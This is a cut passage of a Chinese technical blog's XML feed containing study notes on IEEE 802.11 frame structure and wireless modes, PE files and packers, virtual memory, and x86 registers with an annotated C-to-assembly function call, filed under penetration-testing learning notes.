(未发送数据)</td><td>10</td></tr><tr><td>0111</td><td>Data＋CF-Ack+CF-Poll</td><td>10</td></tr><tr><td>1000</td><td>QoS Data</td><td>10</td></tr><tr><td>1001</td><td>QoS Data + CF-Ack</td><td>10</td></tr><tr><td>1010</td><td>QoS Data + CF-Poll</td><td>10</td></tr><tr><td>1011</td><td>QoS Data + CF-Ack + CF-Pol</td><td>10</td></tr><tr><td>1100</td><td>QoS Null (未发送数据)</td><td>10</td></tr><tr><td>1101</td><td>QoS CF-Ack (未发送数据)</td><td>10</td></tr><tr><td>1110</td><td>QoS CF-Poll (未发送数据)</td><td>10</td></tr><tr><td>1111</td><td>QoS CF-Ack+CF-Poll （未发送数据)</td><td>10</td></tr></tbody></table><ul><li><p>To DS/From DS(1/1 bit)</p><ul><li>0x00:出现在<a href="https://pyrrhax.com/2020/09/24/%E6%97%A0%E7%BA%BF%E7%BD%91%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F%E5%92%8C%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" target="_blank" rel="noopener">IBSS</a>环境中（可能是Management帧或者是Control帧类型）；或者是STSL（Station to Station Link）中两个STA之间通信，这种情况下不通过AP</li><li>0x01:表示data从AP向STA传递</li><li>0x02:表示data从STA向AP传递</li><li>0x03:表示两个AP间通信，这是典型的WDS环境下AP间的通信；或者表示Mesh环境下MP间的通信，只有此时才会使用到Address4字段。</li></ul></li><li><p>More frag(1bit):表示是否还有后续帧</p><ul><li>值为1时表示有后续分段，可能是data或者management帧类型。只有单播接收地址的帧会被分段，广播的直接发送。</li></ul></li><li><p>retry（1bit）:重传</p><ul><li>值为1表示重传帧，可能是data或者management帧类型，接收端进程使用此值防止帧重复；</li></ul></li><li><p>PowerMgmt(1bit):活动模式(0)/省电模式(1)</p><ul><li>STA处于省电模式时，向关联的AP发送该值为1的帧（AP从不使用此字段），省电模式下STA不接受数据，发送给它的Data帧由AP暂时缓存。</li></ul></li><li><p>MoreData(1bit)</p><ul><li>当AP至少缓存了一个MSDU时，会向省电模式的STA发送该值为1的帧，表示有数据要传输给STA，接收到此帧的STA唤醒自己，并向AP发送PS-Poll帧，取回由AP为其缓存的数据。也被用于AP有更多的广播/多播帧需要发送的情况；</li></ul></li><li><p>Protected Frame(bit)</p><ul><li>可能是data或者management帧类型，表示MSDU是否被加密，也被用于表示psk身份验证Frame#3帧；数据载荷为空时，该字段值为0；</li></ul></li><li><p>Order(1bit)</p><ul><li>在非Qos帧的情况下，值为1表示数据必须严格按顺序处理，通常为0</li></ul></li></ul><h4 id="Duration-ID"><a href="#Duration-ID" class="headerlink" title="Duration/ID"></a>Duration/ID</h4><ul><li>所有Control帧都使用该字段，其作用随Type/SubType变化有所不同</li><li>帧类型为PS Poll(type:1,subtype:10)时，表示STA关联的AID(association identity,在sta连上ap时，由ap发送给sta);</li><li>其它情况下，该字段作为一种载波侦听机制，表示接收下一帧之前需要保持的时间间隔，用于（Network Allocation Vector）计算，单位是微秒；</li></ul><h4 id="MAC-Layer-Address"><a href="#MAC-Layer-Address" class="headerlink" title="MAC Layer Address"></a>MAC Layer Address</h4><ul><li>Basic service set ID（BSSID）;它是BSS的2层唯一标识，Infrastructure模式中BSSID就是AP的MAC地址，当AP支持多BSS时，随机生成每个BSSID。</li></ul><h4 id="Sequence-Control（16bit）"><a href="#Sequence-Control（16bit）" class="headerlink" title="Sequence Control（16bit）"></a>Sequence Control（16bit）</h4><ul><li>这个字段包含两个子字段：Sequence Number和Fragment Number；</li><li>Sequence Number是每个帧的编号，数值范围是0-4095，当帧被分段时，同帧不同分段的sequenceNumber相同。</li><li>FragmentNumber是被分段的帧用于标识分段位置顺序的编号，数值范围是0-15，以1为步长递增。</li></ul><h4 id="Frame-Body-变长"><a href="#Frame-Body-变长" class="headerlink" title="Frame Body(变长)"></a>Frame Body(变长)</h4><ul><li>数据字段，未加密的最大MSDU长度为2304字节（其中包含最大256字节的上层头信息，和可被传递的 数据2048字节）。不同的加密方法会增加一定的内容长度。<ul><li>WEP：+8bytes-&gt;2312bytes</li><li>TKIP(WPA1):+20bytes-&gt;2324bytes</li><li>CCMP(WPA2):+16bytes-&gt;2320bytes</li></ul></li></ul><h4 id="FCS-32bit"><a href="#FCS-32bit" class="headerlink" title="FCS(32bit)"></a>FCS(32bit)</h4><ul><li>发送端对全部MAC包头和FrameBody内容进行CRC计算，计算结果即为FCS（FrameCheckSequence）值，接收端进行同样的计算，结果一致时，则接收端向发送端返回ACK，否则丢弃帧（只对单播帧有效，FCS错误的广播/多播帧可能被接收）</li><li>注：wireshark抓包时已经删除了FCS值</li></ul><h3 id="控制帧实例"><a href="#控制帧实例" class="headerlink" title="控制帧实例"></a>控制帧实例</h3><h4 id="ACK"><a href="#ACK" class="headerlink" title="ACK"></a>ACK</h4><ul><li>接收端正确接收数据后向发送端返回ACK确认</li><li>每个单播帧需要立即确认<ul><li>组播和广播帧不需要确认、</li></ul></li><li>尽快响应<ul><li>由硬件完成，而非驱动层</li></ul></li><li>Type/Subtype:1/13</li></ul><h4 id="PS-POLL"><a href="#PS-POLL" class="headerlink" title="PS-POLL"></a>PS-POLL</h4><ul><li>AID——Association ID</li><li>STA省电模式唤醒<ul><li>数据发送至AP（AP缓存数据包）</li><li>通过Beacon发送TIM（traffic indication map）<ul><li>其中包含AID</li></ul></li><li>STA对比AID后唤醒网卡</li><li>STA发送PS-Poll帧，请求从AP缓存中取回数据<ul><li>每个帧都需要ACK确认</li><li>ACK确认后AP从缓存中删除数据帧</li><li>传输过程中STA保持唤醒状态，传输结束后STA恢复省电状态</li></ul></li></ul></li><li>Type/Subtype:1/10</li></ul><h4 id="RTS-CTS"><a href="#RTS-CTS" class="headerlink" title="RTS/CTS"></a>RTS/CTS</h4><ul><li><p>RTS/CTS是CSMA/CA方法的一种补充手段</p></li><li><p>降低冲突产生的可能性</p></li><li><p>正式通信之前通过请求应答机制，确信通信介质的可用性</p></li><li><p>锁定传输介质，预约通信时间</p></li><li><p>只有在传输长帧时使用，传输短帧时不会使用</p><ul><li>驱动接口提供长帧阈值的自定义</li></ul></li><li><p>A —-RTS—-&gt;B</p><p>A&lt;—-CTS—-B</p><p>A—-Data—-&gt;B</p><p>A&lt;—-ACK—-B</p><p>A—-Data—-&gt;B</p><p>A&lt;—-ACK—-B</p><p>……</p></li></ul><h3 id="管理帧实例"><a href="#管理帧实例" class="headerlink" title="管理帧实例"></a>管理帧实例</h3><ul><li>管理帧用于协商和控制STA与AP之间的关系</li></ul><h4 id="Beacon-Frame"><a href="#Beacon-Frame" class="headerlink" title="Beacon Frame"></a>Beacon Frame</h4><ul><li>AP发送的广播帧，通告无线网络的存在（BSSID）</li><li>发包频率<ul><li>102.4ms（可变）</li><li>单位时间1024microsecond（）</li></ul></li><li>SSID网络名<ul><li>隐藏AP不发SSID广播</li></ul></li></ul><h4 id="Probe-Request-Frames"><a href="#Probe-Request-Frames" class="headerlink" title="Probe Request Frames"></a>Probe Request Frames</h4><ul><li>用于STA扫描现有AP<ul><li>发现连接过的AP</li><li>发现未连接的AP</li></ul></li></ul><h4 id="Probe-Response-Frames"><a href="#Probe-Response-Frames" class="headerlink" title="Probe Response Frames"></a>Probe Response Frames</h4><ul><li>发现连接过的AP时，速率和ESSID相同的AP会响应。</li></ul><h4 id="Authentication-Frames"><a href="#Authentication-Frames" class="headerlink" title="Authentication Frames"></a>Authentication Frames</h4><ul><li>Authentication Algorithm身份认证类型<ul><li>0：开放系统身份验证</li><li>1：共享密钥身份验证</li></ul></li><li>身份认证有多个帧交换过程组成</li><li>Authentication Seq<ul><li>每次身份验证过程Seq唯一</li><li>1-65535</li></ul></li><li>Challenge text<ul><li>只用共享密钥方式才有此字段</li></ul></li><li>Status Code：成功/失败</li></ul><h4 id="Association-Reassociation-Freames"><a href="#Association-Reassociation-Freames" class="headerlink" title="Association/Reassociation Freames"></a>Association/Reassociation Freames</h4><ul><li>身份验证后，STA执行关联操作，加入无线网络 </li></ul><h4 id="Disassociation-Deauthentication"><a href="#Disassociation-Deauthentication" class="headerlink" title="Disassociation/Deauthentication"></a>Disassociation/Deauthentication</h4><ul><li>由AP发出，2字节</li></ul><h4 id="ATIM-Frames"><a href="#ATIM-Frames" class="headerlink" title="ATIM Frames"></a>ATIM Frames</h4><ul><li>只在ad-hoc网络下使用<ul><li>STA使用此帧通知接收者其有缓存的数据要发送</li></ul></li></ul><h3 id="数据帧"><a href="#数据帧" class="headerlink" title="数据帧"></a>数据帧</h3><ul><li>传输用户数据<ul><li>DATA Frame</li></ul></li><li>空数据帧<ul><li>Null data frame</li><li>只包含MAC头和FCS</li><li>STA用空数据帧声明自己要进入省电模式</li></ul></li></ul><h3 id="连接到无线网络的过程"><a href="#连接到无线网络的过程" class="headerlink" title="连接到无线网络的过程"></a>连接到无线网络的过程</h3><ul><li>Probe<ul><li>STA向所有信道发出probe帧，发现AP</li><li>AP应答Response</li></ul></li><li>Authentication<ul><li>STA向AP发出验证请求</li><li>发生认证过程</li><li>AP响应STA认证结果</li></ul></li><li>Association<ul><li>STA发出关联请求</li><li>AP响应</li><li>开始通信</li></ul></li></ul><h4 id="WEP-PSK认证过程"><a href="#WEP-PSK认证过程" class="headerlink" title="WEP PSK认证过程"></a>WEP PSK认证过程</h4><ul><li>STA发认证请求</li><li>AP返回随机Challenge消息</li><li>STA使用PSK加密Cha并发回给AP</li><li>AP使用PSK解密，获得Cha并与原始Cha对比，相同则验证成功，不同则失败。</li><li>大部分无线驱动首先尝试open验证，如果失败则尝试PSK</li><li>无论使用什么加密架构，关联过程完全相同<ul><li>STA向AP发送关联请求</li><li>AP向STA发送关联成功或者失败结果</li></ul></li><li>隐藏AP<ul><li>STA关联包中必须包含目标AP的ESSID</li><li>嗅探到此关联包，说明有隐藏AP存在</li></ul></li></ul><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><ul><li>无线安全根源<ul><li>802.11基于无线电波发射信息</li><li>嗅探侦听是主要问题</li><li>加密机制是必须的手段</li></ul></li><li>Wired Equivalent Privacy(WEP)<ul><li>802.11标准的一部分</li><li>发布不久后被发现存在安全漏洞</li></ul></li><li>WiFi Protected Access（WPA）取代WEP<ul><li>WPA2（802.11i标准）</li></ul></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li>协议栈：<a href="https://www.kernel.org/doc/htmldocs/80211/index.html" target="_blank" rel="noopener">https://www.kernel.org/doc/htmldocs/80211/index.html</a></li><li>无线驱动：<a href="https://wireless.wiki.kernel.org/" target="_blank" rel="noopener">https://wireless.wiki.kernel.org/</a></li><li>《802.11权威书》</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟内存与程序调试</title>
      <link href="/2020/09/27/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95/"/>
      <url>/2020/09/27/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><ul><li>Windows的内存可以被分为两个层面：物理内存和虚拟内存。其中物理内存非常复杂，需要静茹Windows内核级别ring0才能看到。通常，在用户模式下，用调试器看到的内存地址都是虚拟内存。</li><li>程序进行虚地址（逻辑地址）到实地址（物理地址）转换的过程称为程序的再定位。</li></ul><a id="more"></a><p>几个重要概念：</p><ul><li>文件偏移地址（File Offset）：数据在PE文件中的地址，相对于文件开头的偏移地址。</li><li>装载基址（Image Base）: PE装入内存时的基地址<ul><li>默认情况下，exe文件在内存中的基地址是0x00400000，dll文件是0x10000000。可以通过修改编译选项修改。</li></ul></li><li>虚拟内存地址（Virtual Address）：PE文件中的指令被装入内存后的地址</li><li>相对虚拟地址(Relative Virtual Address,RVA)：内存地址相对于装载基址的偏移量</li></ul><h3 id="PE文件和内存中的差异"><a href="#PE文件和内存中的差异" class="headerlink" title="PE文件和内存中的差异"></a>PE文件和内存中的差异</h3><ul><li>PE文件中的数据按照磁盘数据标准存放，以0x200字节为基本单位进行组织。</li><li>内存是0x1000字节</li></ul><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li>lordPE</li><li>OllyDbg，适合动态调试</li><li>IDA（Interactive Disassembler）适合静态调试</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件与加壳</title>
      <link href="/2020/09/25/PE%E6%96%87%E4%BB%B6%E4%B8%8E%E5%8A%A0%E5%A3%B3/"/>
      <url>/2020/09/25/PE%E6%96%87%E4%BB%B6%E4%B8%8E%E5%8A%A0%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h2><ul><li>PE（Portable Executable）是Windows下可执行文件遵守的数据格式，如*.exe,*.dll</li><li>除了二进制机器码，还包含了字符串，菜单，图标，位图，字体等。</li><li>在程序被执行时，操作系统会按照PE文件格式的约定去相应的地方准确地定位各种类型的资源，并分别装入不同的区域。</li></ul><a id="more"></a><ul><li>PE文件格式把可执行文件分成若干个数据节（section）<ul><li>rsrc 存放程序资源，如图标，菜单等</li><li>idata可执行文件所使用的动态链接库等外来函数与文件的信息</li><li>text由编译器产生，粗放这二进制的机器代码，也是我们反汇编和调试的对象</li><li>初始化的数据快，如宏定义，全局变量，静态变量等</li></ul></li><li>如果是正常编译出的标准PE文件，其节信息往往是大致相同的，但这些section的名只是为了方便人的记忆与使用，使用Microsoft VisualC++中的编译指示符：#pragma_data_seg()可以把内容编译到任意的节中，节名也是自定义的。</li></ul><h2 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h2><ul><li><p>全称：可执行 程序资源压缩，是保护文件的常用手段。</p></li><li><p>加壳后，PE的节信息就会变得非常古怪，在Crack和反病毒分析中需要经常处理这类古怪的PE文件。</p></li><li><p>加壳过的程序可以直接运行，但是不能查看源代码，需要经过脱壳才可以查看。</p></li><li><p>加壳类似于压缩，解压程序附加在原程序上，通过Windos加载器载入内存后，先于原程序执行，得到控制权，执行过程之中对原程序进行解密、还原，还原完成后再把控制权交还给原始程序，执行原来的代码部分。</p></li><li><p>加壳后，原始程序代码在磁盘文件中是以加密之后的形式存在的，只是在执行时还原，这样就可以比较有效的防止对程序文件的非法修改和静态反编译。</p></li><li><p>加壳工具分为两种：</p><ul><li>压缩壳：减小软件体积，加密保护不是重点。</li><li>加密壳种类比较多，不同的壳侧重点不同，一些壳单纯保护程序，另一些壳提供额外的功能，如提供注册机智，使用次数，时间限制等。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞利用及渗透测试基础学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编-一个函数调用的例子</title>
      <link href="/2020/09/25/%E6%B1%87%E7%BC%96-%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E4%BE%8B%E5%AD%90/"/>
      <url>/2020/09/25/%E6%B1%87%E7%BC%96-%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E4%BE%8B%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<h2 id="汇编-寄存器及主要指令"><a href="#汇编-寄存器及主要指令" class="headerlink" title="汇编-寄存器及主要指令"></a>汇编-寄存器及主要指令</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>可以分为四类：</p><ul><li><p>数据寄存器</p><ul><li><p>EAX（Accumulator）</p><ul><li>可用于乘除，输入输出等操作，他们的使用频率很高。EAX还通常用于存储函数的返回值。</li></ul></li><li><p>EBX（Base Register） </p><ul><li>作为存储器指针来使用，用来访问存储器。</li></ul></li><li><p>ECX (Count Register)</p><ul><li>在循环和字符串操作时，用来控制循环次数；在移多位时，要用CL来指明移位的位数。</li></ul></li><li><p>EDX (Data Register)</p><ul><li>在进行乘除运算时，作为默认操作数参与运算，也可用于存放I/O的端口地址。</li></ul></li></ul><a id="more"></a></li><li><p>地址寄存器：</p><ul><li>变址（ESI，EDI）<ul><li>分别作为“原地址指针”和“目的地址指针”</li></ul></li><li>指针（ESP,EBP）<ul><li>栈帧顶，栈帧底</li></ul></li></ul></li><li><p>段寄存器：ES CS SS DS FS GS</p><ul><li>内存单元的物理地址，由段寄存器的值和一个偏移量组合，组成一个大的内存地址。</li><li>CS:代码段</li><li>DS：数据段</li><li>ES：附加段</li><li>SS：堆栈段</li><li>FS：附加段</li><li>GS 附加段</li><li>融合变址寄存器，在很多字符串操作指令中，DS:ESI指向源串，ES:EDI指向目标串。</li></ul></li><li><p>指令寄存器  EIP（下一步执行的代码）; 标志寄存器 EFlags</p></li></ul><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><ul><li>数据传送指令：<ul><li>MOV  目的操作数，源操作数</li><li>XCHG 寄存器A ，寄存器B 交换</li><li>PUSH 寄存器，POP 寄存器 把寄存器的操作数压入堆栈或从堆栈取出到寄存器</li><li>PUSHF,POPF （标志寄存器出入栈）</li><li>PUSHA,POPA 这两个指令的作用是把通用寄存器压栈出栈。寄存器的入栈顺序依次是：EAX,ECX,EDX,EBX,ESP(初始值)，EBP,ESI,EDI.出栈相反。</li><li>LEA,LDS,LES 取地址到寄存器</li></ul></li><li>位运算指令：<ul><li>ADN,OR,XOR,NOT,TEST</li><li>SHR,SHL,SAR,,SAL  算数移动和逻辑移动</li><li>ROR,ROL,RCR,RCL 循环位移</li></ul></li><li>算数运算指令：<ul><li>ADD ADC 加法</li><li>SUB SBB 减</li><li>INC EDC 自增 自减</li><li>NEG 自反</li><li>MUL IMUL 乘</li><li>DIV IDIV 除</li></ul></li><li>流程控制指令<ul><li>CMP 比较op1与op2的值</li><li>JMP 跳转指定地址</li><li>LOOP 循环指令</li><li>CALL RET 子程序点用，返回</li><li>INT IRET中断调用及返回</li><li>REP REPE REPNE 重复前缀指令</li></ul></li><li>条件转移命令<ul><li>JXX：当特定条件成立则跳往指定地址<ul><li>Z为0</li><li>G大于</li><li>L小于</li><li>E等于</li><li>N相反</li></ul></li></ul></li><li>字符串操作指令集<ul><li>MOVSB MOVSW MOVSD字符串传送指令(B字节，W字，D双字)</li><li>CMPSB CMPSW CMPSD 字符串比较指令</li><li>SCASB,SCASW字符串搜索指令</li><li>LODSB,LODSW,STOSB,STOSW字符串载入或驻存指令</li></ul></li></ul><h2 id="一个程序调用的例子"><a href="#一个程序调用的例子" class="headerlink" title="一个程序调用的例子"></a>一个程序调用的例子</h2><h3 id="C语言程序"><a href="#C语言程序" class="headerlink" title="C语言程序"></a>C语言程序</h3><figure class="hljs highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x,<span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> z=<span class="hljs-number">0</span>;<br>    z=x+y;<br>    <span class="hljs-keyword">return</span> z;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> n=<span class="hljs-number">0</span>;<br>    n=add(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>,n);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>一个例子：</p><ul><li>main</li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">void main()<br>***********<br>int n&#x3D;0;<br>0041140E mov dword ptr[n],0<br>n&#x3D;add(1,3);<br>00411415 push 3&#x2F;&#x2F;<br>00411417 push 1&#x2F;&#x2F; 参数入栈后ESP抬高（值变小，往低地址拓展）<br>00411419 call add(411096h)&#x2F;&#x2F;EIP入栈，ESP抬高，跳转到函数入口地址<br>0041141E add  esp,8&#x2F;&#x2F;add完之后恢复栈帧<br>00411421 mov  dword ptr[n],eax  &#x2F;&#x2F;函数返回的结果存储在eax中，此时把结果赋值给n<br>printf(&quot;%d\n,n&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>add(int x,int y)</li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">int add(int x,int y)<br>&#123;<br>********栈空间分配******<br>004113A0 push ebp&#x2F;&#x2F;将主函数栈底EBP入栈，ESP抬高（将原来的栈底入栈，准备指向新的栈底）<br>004113A1 mov ebp,esp&#x2F;&#x2F;将ebp和esp都指向栈顶，目前栈里是空的，esp&#x3D;ebp<br>004113A3 sub esp,0CCH&#x2F;&#x2F;0CCH由编译器确定，esp向上抬高CCH，栈成型<br>********初始化*********<br>004113A9 push ebx&#x2F;&#x2F;用于保存现场， ebx作为内存偏移指针使用,esp抬高<br>004113AA push esi&#x2F;&#x2F;用于保存现场， esi是源地址寄存器,esp抬高<br>004113AB push edi&#x2F;&#x2F;用于保存现场， edi是目的指针寄存器,esp抬高<br>004113AC lea edi,[ebp-0CCH]&#x2F;&#x2F;将当前栈顶地址装入EDI<br>004113B2 mov ecx,33h&#x2F;&#x2F;设置计数器数值<br>004113B7 mov eax,0CCCCCCCCh<br>004113BC rep stos dword ptr es:[edi]&#x2F;&#x2F;循环，将栈区的数据都初始化为CCH，每次将edi+1<br>********执行函数体******<br>int z&#x3D;0<br>004113BE mov dword ptr[z],0 &#x2F;&#x2F;将z初始化为0<br>004113C5 mov eax,dowrd ptr[x]&#x2F;&#x2F;将x赋值给eax<br>004113C8 add eax,dword ptr[y]&#x2F;&#x2F;将寄存器eax的值加y<br>004113CB mov dword ptr[z],eax&#x2F;&#x2F;将eax的值赋值给z<br>004113CE mov eax,dword ptr[z]&#x2F;&#x2F;将z的值放到eax <br>********恢复到主函数*******<br>004113D1 pop edi;&#x2F;&#x2F;恢复寄存器值<br>004113D2 pop esi;&#x2F;&#x2F;恢复寄存器值<br>004113D3 pop ebx;&#x2F;&#x2F;恢复寄存器值<br>004113D4 mov esp,ebp;&#x2F;&#x2F;栈顶指向之前的栈底，上面的栈帧不要了<br>004113D6 pop ebp;&#x2F;&#x2F;恢复寄存器值<br>004113D7 ret;&#x2F;&#x2F;根据返回地址，恢复EIP值，相当于popEIP<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞利用及渗透测试基础学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线网运行模式和硬件设备基础知识</title>
      <link href="/2020/09/24/%E6%97%A0%E7%BA%BF%E7%BD%91%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F%E5%92%8C%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/09/24/%E6%97%A0%E7%BA%BF%E7%BD%91%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F%E5%92%8C%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="无线网运行模式和硬件设备基础知识"><a href="#无线网运行模式和硬件设备基础知识" class="headerlink" title="无线网运行模式和硬件设备基础知识"></a>无线网运行模式和硬件设备基础知识</h2><h3 id="无线网络运行模式"><a href="#无线网络运行模式" class="headerlink" title="无线网络运行模式"></a>无线网络运行模式</h3><p>也称为无线网络架构，默认情况下有两种：</p><ul><li><p>Infrastructure</p><ul><li>AP维护SSID</li><li>至少包含一个AP和一个Station，形成一个Basic Service Set(BSS)</li><li>AP连接到有线网络，称为Distribution System(DS)</li><li>连接到同一个DS的多个AP形成一个Extended Service Set(ESS)</li></ul></li></ul><a id="more"></a><ul><li><p>Ad-Hoc</p><ul><li>STA维护SSID</li><li>也称为Independent Basic Service Set(IBSS)</li><li>也称为peer to peer 模式</li><li>其中一个STA负责AP的工作<ul><li>通过beacon广播SSID</li><li>对其它STAs进行身份验证</li></ul></li></ul><p>Service Set Identifier(SSID)</p><ul><li>AP每秒钟约10次通过Beacon帧广播SSID</li><li>客户端连接到无线网络后也会宣告SSID</li></ul></li></ul><h4 id="Wireless-Distribution-System-WDS"><a href="#Wireless-Distribution-System-WDS" class="headerlink" title="Wireless Distribution System(WDS)"></a>Wireless Distribution System(WDS)</h4><ul><li>与有线DS类似，只是用过无线连接的多个AP组成的网络<ul><li>Bridging——只有AP间彼此通信</li><li>Repeating——允许所有AP和STA彼此通信</li></ul></li></ul><h4 id="MONITOR-MODE"><a href="#MONITOR-MODE" class="headerlink" title="MONITOR MODE"></a>MONITOR MODE</h4><ul><li>并不是一种真正的无线模式</li><li>允许无线网卡没有任何筛选地抓包（802.11包头）</li><li>类比有线网络的混杂模式</li><li>适合的网卡和驱动不但可以monitor,更可以Injection</li></ul><h3 id="无线网硬件设备及基本概念"><a href="#无线网硬件设备及基本概念" class="headerlink" title="无线网硬件设备及基本概念"></a>无线网硬件设备及基本概念</h3><h4 id="无线网卡"><a href="#无线网卡" class="headerlink" title="无线网卡"></a>无线网卡</h4><ul><li>需要可以Monitor,可以Injection</li></ul><h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><ul><li>分贝dB<ul><li>测量无线信号强度</li></ul></li><li>B：向Alexander Graham Bell 致敬<ul><li>今天大部分声学设备的发明者和理论奠基人</li></ul></li><li>dB：表示2个信号之间的差异比率，用于描述设备的信号强度<ul><li>是一个相对值</li></ul></li><li>dBm：功率值与1mW进行比较的dB值结果</li><li>每增加3dBm，功率增加约1倍</li><li>每增加10dBm，功率约增加10倍</li><li>全向天线<ul><li>dBi：全向天线辐射强度</li><li>波形：甜甜圈</li><li>增益过高的全向天线会变成定向天线</li></ul></li><li>定向天线<ul><li>dBd：定向天线辐射强度</li><li>双四边形，定向发送信号，比全向天线距离更远（方向正确情况下）</li><li>八木天线，引向反射天线</li><li>平面天线：用于办公室，美观</li><li>扇形天线：常用于移动电话网络3到4个联合使用实现全向信号覆盖</li><li>网状天线：射束带更加集中，功率更强</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线通信基础知识-IEEE802.11标准</title>
      <link href="/2020/09/23/%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-IEEE-802-11%E6%A0%87%E5%87%86/"/>
      <url>/2020/09/23/%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-IEEE-802-11%E6%A0%87%E5%87%86/</url>
      
